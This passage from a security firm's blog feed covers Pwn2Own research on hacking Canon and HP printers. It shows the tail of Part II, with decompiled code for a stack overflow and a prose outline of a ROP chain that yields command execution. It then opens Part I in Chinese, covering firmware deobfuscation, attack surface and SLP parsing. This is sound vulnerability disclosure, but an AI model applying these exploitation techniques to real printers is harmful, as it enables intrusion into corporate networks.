        &lt;span class=&quot;n&quot;&gt;pagenumber&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v20&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;first_path_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v20&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;next_char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xDF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strcmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;second_path_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Pages&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dword_5DBC8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strtol&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;first_path_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_37&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v24&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strtol&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pagenumber&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rest_scan_send_scan_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;rest_scan_vp_thread_created&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rest_scan_send_err_reply&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;400&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;But when it parse the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pathinfo&lt;/code&gt; at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[2]&lt;/code&gt;, it does not check the length of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pathinfo&lt;/code&gt;. Then copy the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pathinfo&lt;/code&gt; to the local buffer(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;first_path_info[32]&lt;/code&gt;), which leads to a stack overflow.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Exploitation&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;We can construct the request to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/Scan/Jobs/&lt;/code&gt; to trigger it. It does not have Stack Guard, so we can overwrite the return address directly. But it has DEP, we need to do ROP to achieve our goal. Finally, we use ROP to overwrite the GOT of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strncmp&lt;/code&gt;. After overwriting it, we can execute arbitrary commands when we access &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/Copy/{cmd}&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;However, in the end, this vulnerability collided with another team’s discovery.&lt;/p&gt;

&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;

&lt;p&gt;Based on the results from Pwn2Own Austin 2021 to Pwn2Own Toronto 2022, printer security remains an easily overlooked issue. In just one year, the number of teams capable of compromising printers has significantly increased. Even in the third year, at &lt;a href=&quot;https://www.zerodayinitiative.com/blog/2023/10/23/pwn2own-toronto-2023-the-schedule&quot;&gt;Pwn2Own Toronto 2023&lt;/a&gt;, many teams still found vulnerabilities. It is recommended for everyone using these IoT devices to turn off unnecessary services, set up firewalls properly, and ensure appropriate access controls to reduce the risk of attacks.&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2023/11/06/your-printer-is-not-your-printer-hacking-printers-pwn2own-part2-en/</link>
                <guid>https://devco.re/blog/2023/11/06/your-printer-is-not-your-printer-hacking-printers-pwn2own-part2-en</guid>
                <pubDate>Mon, 06 Nov 2023 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Your printer is not your printer ! - Hacking Printers at Pwn2Own Part I</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2023/10/05/your-printer-is-not-your-printer-hacking-printers-pwn2own-part1-en/&quot;&gt;English Version&lt;/a&gt;, &lt;a href=&quot;/blog/2023/10/05/your-printer-is-not-your-printer-hacking-printers-pwn2own-part1/&quot;&gt;中文版本&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;印表機近年來已成為企業內網中不可或缺的設備之一，功能也隨著科技的發展日益增多，除了一般的傳真及列印之外，也開始支援 AirPrint 等雲端列印服務，讓列印更加方便，直接使用行動裝置就可以輕鬆列印，更成為了 IoT 中，不可或缺的一環，正因為其便利，也常被用於列印公司內部機敏文件，使得在企業中印表機的安全性更加的重要。&lt;/p&gt;

&lt;p&gt;而前年我們也在 Canon 及 HP 的印表機中發現了 Pre-auth RCE 的漏洞(&lt;a href=&quot;https://www.zerodayinitiative.com/advisories/ZDI-22-515/&quot;&gt;CVE-2022-24673&lt;/a&gt; 及 &lt;a href=&quot;https://www.zerodayinitiative.com/advisories/ZDI-22-532/&quot;&gt;CVE-2022-3942&lt;/a&gt;) 及 Lexmark 發現漏洞(&lt;a href=&quot;https://www.zerodayinitiative.com/advisories/ZDI-22-332/&quot;&gt;CVE-2021-44734&lt;/a&gt;)，並在 Pwn2Own Austin 2021 中取得了 Canon ImageCLASS MF644Cdw、 HP Color LaserJet Pro MFP M283fdw 及 Lexmark MC3224i 的控制權，而成功獲得 Pwn2Own 中駭客大師(Master of Pwn) 的點數，這篇研究將講述 Canon 及 HP 漏洞的細節及我們的利用方式。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/1.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;此份研究亦發表於 &lt;a href=&quot;https://hitcon.org/2022/agenda/704bf58c-c42b-4593-97c0-9aba91caa6e4&quot;&gt;HITCON 2022&lt;/a&gt; 及 &lt;a href=&quot;https://codeblue.jp/2022/en/talks/&quot;&gt;CODE BLUE 2022&lt;/a&gt;，你可以從&lt;a href=&quot;https://hitcon.org/2022/slides/Your%20Printer%20is%20not%20your%20Printer%20!%20-%20Hacking%20Printers%20at%20Pwn2Own.pdf&quot;&gt;這裡&lt;/a&gt;取得投影片！&lt;/p&gt;

&lt;h2 id=&quot;printer&quot;&gt;Printer&lt;/h2&gt;
&lt;p&gt;早期在使用印表機時，往往會需要使用 IEEE1284 或是 USB 的 Printer cable 來將印表機接上電腦，並且在使用時會額外裝上廠商所附的驅動程式。而現今的印表機已可以接上網路，並多了各式各樣的功能，通常只要將印表機接上區網，區網中的電腦就可以輕易地發現你所新安裝的印表機。&lt;/p&gt;

&lt;p&gt;目前市面上的印表機預設都開了非常多的服務，不外乎就是為了讓列印更加方便，像是 FTP、AirPrint、Bonjour 等等服務。&lt;/p&gt;

&lt;h2 id=&quot;motivation&quot;&gt;Motivation&lt;/h2&gt;

&lt;h3 id=&quot;為何要研究印表機呢&quot;&gt;為何要研究印表機呢？&lt;/h3&gt;

&lt;h4 id=&quot;紅隊內網需求&quot;&gt;紅隊內網需求&lt;/h4&gt;
&lt;p&gt;過去我們團隊在執行紅隊演練過程中，印表機普遍出現於現代企業內網中，幾乎都會有一台以上，但往往是被忽略的一塊，也常常沒在更新。印表機本身也非常適合作為攻擊者的藏身處，通常很難被偵測出來。值得一提的是比較大型的企業也很有可能將其接上 AD，成為獲取機密資訊的入口。&lt;/p&gt;

&lt;h4 id=&quot;pwn2own-austin-2021&quot;&gt;Pwn2Own Austin 2021&lt;/h4&gt;
&lt;p&gt;另外一點是印表機在 2021 時，首次成為了 Pwn2Own Mobile 主要推動的目標之一，而我們剛好當時也準備再次挑戰 Pwn2Own 舞台，便決定一探究竟。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/2.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;起初我們原本以為非常簡單，跟多數的 IoT 設備一樣，能輕易的找到 Command injection 問題，殊不知有不少印表機都是使用 RTOS，並非一般的 Linux 系統，但這更是驅動了我們挑戰它的決心。&lt;/p&gt;

&lt;p&gt;本篇將會著重在較為精彩的 Canon 及 HP 部分，Lexmark 有機會再談談。&lt;/p&gt;

&lt;h2 id=&quot;analysis&quot;&gt;Analysis&lt;/h2&gt;
&lt;p&gt;剛開始研究的時候，我們參考了許多&lt;a href=&quot;https://chdk.fandom.com/wiki/DryOS_PIXMA_Printer_Shell&quot;&gt;資料&lt;/a&gt;都是需要拆解硬體來分析，才能獲得 debug console，再用 dump memory 方式來獲取原始的 firmware。但最終我們採用了其他的方式，並沒有拆解任何一台印表機。&lt;/p&gt;

&lt;h3 id=&quot;canon&quot;&gt;Canon&lt;/h3&gt;

&lt;h4 id=&quot;firmware-extract&quot;&gt;Firmware Extract&lt;/h4&gt;
&lt;p&gt;初始分析版本為 v6.03，我們一開始使用 &lt;a href=&quot;https://github.com/ReFirmLabs/binwalk&quot;&gt;binwalk&lt;/a&gt; 去解析它，但 firmware 是經過混淆的，我們並沒辦法直接解開。&lt;/p&gt;

&lt;p&gt;圖: 經過混淆的 Canon ImageCLASS MF644Cdw fimware 
&lt;img src=&quot;/assets/img/blog/20231005/3.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我們這邊也嘗試過了 &lt;a href=&quot;https://www.synacktiv.com/publications/treasure-chest-party-quest-from-doom-to-exploit.html&quot;&gt;TREASURE CHEST PARTY QUEST: FROM DOOM TO EXPLOIT&lt;/a&gt; by Synacktiv 及 &lt;a href=&quot;https://web.archive.org/web/20220224100459/https://www.contextis.com/en/blog/hacking-canon-pixma-printers-doomed-encryption&quot;&gt;Hacking Canon Pixma Printers – Doomed Encryption&lt;/a&gt; by Contextis Research 的研究，但這次是完全不同的系列，我們無法使用同樣的方法解開混淆過的 firmware。&lt;/p&gt;

&lt;p&gt;於是我們開始分析混淆過的 firmware 格式及內容。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/4.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我們大致上可以從混淆過的 firmware 看到，每個混淆過的 firmware 的開頭都會是 NCFW 這個 Magic，並帶有該 firmware 大小，而其他部分則是混淆過的資料。&lt;/p&gt;

&lt;p&gt;於是我們開始猜想，也許這台印表機舊版本的 firmware 沒有混淆，直到某一版才開始混淆，如果可以抓到中介版本，可能有機會獲得解混淆的方法。而這個 Magic 也可以讓我們辨別是不是經過混淆的。&lt;/p&gt;

&lt;p&gt;以下這個網址是透過官網或是擷取封包獲得的 firmware 下載網址&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://pdisp01.c-wss.com/gdl/WWUFORedirectTarget.do?id=MDQwMDAwNDc1MjA1&amp;amp;cmp=Z01&amp;amp;lang=EN
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;經過分析後，可以拆分為多個部分&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/5.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;約略可以歸納出下載網址的規則，我們可以藉由這個方法來載到所有版本的 firmware，當時我們載到的版本有&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;V2.01&lt;/li&gt;
  &lt;li&gt;V4.02&lt;/li&gt;
  &lt;li&gt;V6.03&lt;/li&gt;
  &lt;li&gt;V9.03&lt;/li&gt;
  &lt;li&gt;V10.02&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;而 v10.02 是幾周後會釋出的版本，可以先從這邊優先載到。載完所有版本後，我們發現該系列版本的 firmware 都是經過混淆的，無法從先前版本獲得解混淆的方法。但我們可以下載 Canon 其他系列的印表機，嘗試找找是否有類似的混淆演算法。載完約有 130 GB 大小。透過 grep 找 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NCFW&lt;/code&gt; 及 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;servicemode.html&lt;/code&gt; 可以找到未混淆的 firmware。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/6.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;最後找到四組符合條件的 firmware，我們這邊選擇了 WG7000 系列的印表機來分析，並找到了疑似解混淆的函式。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/7.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;很幸運的，藉由重寫這個函式，可以解出明文的 MF644Cdw firmware。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/8.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在解出 firmware 之後，必須找出 firmware 的 image base address，IDA 才能有效地辨別跟 reference。此處可透過常見的分析工具 &lt;a href=&quot;https://github.com/sgayou/rbasefind&quot;&gt;rbasefind&lt;/a&gt; 來找 image base。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/9.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;一開始找出的 base 為 0x40b0000，但丟進 IDA 後，卻發現大部分的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;函式&lt;/code&gt;與 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;debug message&lt;/code&gt; 的字串對映不起來。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/10.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;如上圖所示，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;loc_4489AC08&lt;/code&gt; 應該指向函式名稱的字串，然而此地址卻不是正常的字串，而是被當成 code 區段，內容也不是字串，表示此位置並非真正位置，而是有些許的偏移，但正常 function 的解析沒甚麼太大問題。這邊可以先找一個&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;已知函式名稱的函式&lt;/code&gt;和找到屬於他的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;函式名稱字串&lt;/code&gt;來做調整，找到其中差異的 offset 後，將 image base 調到正確位置就可以了。最終找到的 image base 為 &lt;strong&gt;0x40affde0&lt;/strong&gt;。調整完後，可看到原本的函式已可正確識別函式名稱。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/11.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;接下來就可以正常分析 firmware，而初步分析後可得知，Canon ImageCLASS MF644Cdw 架構如下&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;OS - DryOSV2
    &lt;ul&gt;
      &lt;li&gt;Customized RTOS by Canon&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ARMv7 32bit little-endian&lt;/li&gt;
  &lt;li&gt;Linked with application code into single image
    &lt;ul&gt;
      &lt;li&gt;Kernel&lt;/li&gt;
      &lt;li&gt;Service&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;hp&quot;&gt;HP&lt;/h3&gt;

&lt;p&gt;HP 的 firmware 取得相對容易許多，我們可以透過 &lt;a href=&quot;https://github.com/fkie-cad/fact_extractor/issues/37&quot;&gt;binwalk -Z&lt;/a&gt; 來獲得正確的 firmware，約略需要花 3-4 天左右的時間，而其他找 image base address 等步驟，則與 Canon 相同，此處就不贅述。經過初步分析後，HP Color LaserJet Pro MFP M283fdw 架構如下&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;OS
    &lt;ul&gt;
      &lt;li&gt;RTOS - Modify from ThreadX/Green Hills&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ARM11 Mixed-endian
    &lt;ul&gt;
      &lt;li&gt;Code - little-endian&lt;/li&gt;
      &lt;li&gt;Data - Big-endian&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;attack-surface&quot;&gt;Attack Surface&lt;/h2&gt;
&lt;p&gt;在現今市面上大多數的多功能事務機中，預設都會開啟一堆服務&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Service&lt;/th&gt;
      &lt;th&gt;Port&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;RUI&lt;/td&gt;
      &lt;td&gt;TCP 80/443&lt;/td&gt;
      &lt;td&gt;Web interface&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;PDL&lt;/td&gt;
      &lt;td&gt;TCP 9100&lt;/td&gt;
      &lt;td&gt;Page Description Language&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;PJL&lt;/td&gt;
      &lt;td&gt;TCP 9100&lt;/td&gt;
      &lt;td&gt;Printer Job Language&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;IPP&lt;/td&gt;
      &lt;td&gt;TCP 631&lt;/td&gt;
      &lt;td&gt;Internet Printing Protocol&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;LPD&lt;/td&gt;
      &lt;td&gt;TCP 515&lt;/td&gt;
      &lt;td&gt;Line Printer Daemon Protocol&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;SNMP&lt;/td&gt;
      &lt;td&gt;UDP 161&lt;/td&gt;
      &lt;td&gt;Simple Network Management Protocol&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;SLP&lt;/td&gt;
      &lt;td&gt;TCP 427&lt;/td&gt;
      &lt;td&gt;Service Location Protocol&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;mDNS&lt;/td&gt;
      &lt;td&gt;UDP 5353&lt;/td&gt;
      &lt;td&gt;Multicast DNS&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;LLMNR&lt;/td&gt;
      &lt;td&gt;UDP 5355&lt;/td&gt;
      &lt;td&gt;Link-Local Multicast Name Resolution&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;…&lt;/td&gt;
      &lt;td&gt;…&lt;/td&gt;
      &lt;td&gt;…&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;一般來說，為了方便管理，通常都會開 RUI (web 介面) ，再來是 9100 Port 也是印表機常使用的 Port，主要會用來傳輸列印的資料。其他部分則會依照廠商不同而有所不同，不過上述所列的服務通常都會有，且預設大部分都是開啟的。在評估過這些服務後，決定注重在發現服務及 DNS 系列的協定，因為我們的長期經驗下來，常常觀察到 vendor 在開發這些服務時，往往是自行開發實作，而不是使用存在已久的 Open Source。但實際上來說，實作這些協定很容易出現問題的。我們當時主要分析的服務主要有 &lt;strong&gt;SLP&lt;/strong&gt;、&lt;strong&gt;mDNS&lt;/strong&gt; 及 &lt;strong&gt;LLMNR&lt;/strong&gt;。&lt;/p&gt;

&lt;p&gt;接下來就以 Pwn2Own Austin 2021 作為 Case Study，來看看這些協定常會有哪些問題。&lt;/p&gt;

&lt;h2 id=&quot;hacking-printers-at-pwn2own&quot;&gt;Hacking printers at Pwn2Own&lt;/h2&gt;

&lt;h3 id=&quot;canon-1&quot;&gt;Canon&lt;/h3&gt;

&lt;h4 id=&quot;service-location-protocol&quot;&gt;Service Location Protocol&lt;/h4&gt;
&lt;p&gt;SLP 是一種服務發現協定，主要用於讓電腦快速找到印表機，過去在 ESXI 中，&lt;a href=&quot;https://www.zerodayinitiative.com/blog/2021/3/1/cve-2020-3992-amp-cve-2021-21974-pre-auth-remote-code-execution-in-vmware-esxi&quot;&gt;SLP 也常常出問題&lt;/a&gt;，而在 Canon 的 SLP 服務，主要由 Canon 自己實作，SLP 服務細節可參考 &lt;a href=&quot;https://www.ietf.org/rfc/rfc2608.txt&quot;&gt;RFC2608&lt;/a&gt;。在我們分析 SLP 前必須先了解 SLP 封包大致上的結構&lt;/p&gt;

&lt;p&gt;圖: SLP Packet Structure
&lt;img src=&quot;/assets/img/blog/20231005/12.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;這邊只需要關注&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;function-id&lt;/code&gt;，此欄位會決定請求型態，也會決定 payload 部分的格式。而 Canon 只有實作 Service Request 及 Attribute Request 兩種。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/13.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在 Attribute Request (AttrRqst) 的請求中，允許使用者可以根據 service 及 scope 來獲得 attribute list。
scope 可以定義要找的範圍，如 canon 印表機。&lt;/p&gt;

&lt;p&gt;Example:
&lt;img src=&quot;/assets/img/blog/20231005/14.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;而 Attribute request 結構大致如下&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/15.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;主要是長度(Length)及數值(Value)的組合，通常在 Parse 這種格式，很容易出問題，需要特別注意，而實際上 Canon 在 Parse 這個結構時就出了問題。&lt;/p&gt;

&lt;h4 id=&quot;vulnerability&quot;&gt;Vulnerability&lt;/h4&gt;
&lt;p&gt;Canon 在 parse scope list 時，會將跳脫字元轉換成 ASCII，例如 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\41&lt;/code&gt; 會轉換成 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;A&lt;/code&gt; ，然而這個簡單轉換會有怎樣的問題呢? 我們來看一下 Pseudo code&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;parse_scope_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(...){&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;36&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
